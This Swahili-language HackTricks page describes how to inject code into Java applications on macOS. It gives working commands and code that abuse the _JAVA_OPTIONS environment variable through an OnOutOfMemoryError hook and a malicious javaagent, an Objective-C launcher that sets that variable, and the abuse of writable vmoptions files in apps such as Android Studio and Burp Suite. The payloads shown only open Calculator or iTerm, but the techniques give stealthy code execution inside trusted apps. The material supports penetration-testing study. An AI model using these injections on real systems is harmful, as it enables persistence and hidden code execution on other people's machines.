# Java Applications Injection kwenye macOS

{{#include ../../../banners/hacktricks-training.md}}

## Enumeration

Tafuta Java applications zilizosakinishwa kwenye mfumo wako. Imegunduliwa kuwa Java apps kwenye **Info.plist** zitakuwa na baadhi ya java parameters zilizo na string **`java.`**, hivyo unaweza kuitafuta:
```bash
# Search only in /Applications folder
sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null

# Full search
sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
```
## \_JAVA_OPTIONS

Kigezo cha mazingira **`_JAVA_OPTIONS`** kinaweza kutumiwa kuingiza parameta za java za kiholela wakati wa kutekeleza app iliyocompileiwa kwa java:
```bash
# Write your payload in a script called /tmp/payload.sh
export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
```
Ili kuiendesha kama mchakato mpya na si kama mtoto wa terminal ya sasa unaweza kutumia:
```objectivec
#import <Foundation/Foundation.h>
// clang -fobjc-arc -framework Foundation invoker.m -o invoker

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Specify the file path and content
NSString *filePath = @"/tmp/payload.sh";
NSString *content = @"#!/bin/bash\n/Applications/iTerm.app/Contents/MacOS/iTerm2";

NSError *error = nil;

// Write content to the file
BOOL success = [content writeToFile:filePath
atomically:YES
encoding:NSUTF8StringEncoding
error:&error];

if (!success) {
NSLog(@"Error writing file at %@\n%@", filePath, [error localizedDescription]);
return 1;
}

NSLog(@"File written successfully to %@", filePath);

// Create a new task
NSTask *task = [[NSTask alloc] init];

/// Set the task's launch path to use the 'open' command
[task setLaunchPath:@"/usr/bin/open"];

// Arguments for the 'open' command, specifying the path to Android Studio
[task setArguments:@[@"/Applications/Android Studio.app"]];

// Define custom environment variables
NSDictionary *customEnvironment = @{
@"_JAVA_OPTIONS": @"-Xms2m -Xmx5m -XX:OnOutOfMemoryError=/tmp/payload.sh"
};

// Get the current environment and merge it with custom variables
NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary:[[NSProcessInfo processInfo] environment]];
[environment addEntriesFromDictionary:customEnvironment];

// Set the task's environment
[task setEnvironment:environment];

// Launch the task
[task launch];
}
return 0;
}
```
Hata hivyo, hilo litasababisha error kwenye app inayotekelezwa; njia nyingine ya stealth zaidi ni kuunda java agent na kutumia:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
> [!CAUTION]
> Kuunda agent kwa **Java version tofauti** na ile ya application kunaweza kusababisha execution ya agent na application zote mbili ku-crash

Ambapo agent inaweza kuwa:
```java:Agent.java
import java.io.*;
import java.lang.instrument.*;

public class Agent {
public static void premain(String args, Instrumentation inst) {
try {
String[] commands = new String[] { "/usr/bin/open", "-a", "Calculator" };
Runtime.getRuntime().exec(commands);
}
catch (Exception err) {
err.printStackTrace();
}
}
}
```
Ili ku-compile agent, endesha:
```bash
javac Agent.java # Create Agent.class
jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
```
Kwa kutumia `manifest.txt`:
```
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
```
Kisha export env variable na uendeshe java application kama ifuatavyo:
```bash
export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
"/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"

# Or

open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
```
## vmoptions file

Faili hii inaunga mkono uainishaji wa **Java params** wakati Java inatekelezwa. Unaweza kutumia baadhi ya mbinu za awali kubadilisha Java params na **kuufanya mchakato utekeleze amri kiholela**.\
Zaidi ya hayo, faili hii inaweza pia **kujumuisha nyingine** kwa kutumia directory ya `include`, hivyo unaweza pia kubadilisha faili iliyojumuishwa.

Zaidi ya hapo, baadhi ya Java apps **zitapakia zaidi ya faili moja ya `vmoptions`**.

Baadhi ya applications kama Android Studio huonyesha katika **output mahali zinapotafuta** faili hizi, kama vile:
```bash
/Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions

2023-12-13 19:53:23.920 studio[74913:581359] fullFileName is: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] fullFileName exists: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.920 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app/Contents/bin/studio.vmoptions
2023-12-13 19:53:23.921 studio[74913:581359] parseVMOptions: /Applications/Android Studio.app.vmoptions
2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
```
Ikiwa hazifanyi hivyo, unaweza kuikagua kwa urahisi kwa:
```bash
# Monitor
sudo eslogger lookup | grep vmoption # Give FDA to the Terminal

# Launch the Java app
/Applications/Android\ Studio.app/Contents/MacOS/studio
```
Kumbuka jinsi inavyovutia kwamba Android Studio katika mfano huu inajaribu kupakia faili **`/Applications/Android Studio.app.vmoptions`**, mahali ambapo mtumiaji yeyote kutoka kwenye **`admin` group ana ruhusa ya kuandika.**

{{#include ../../../banners/hacktricks-training.md}}
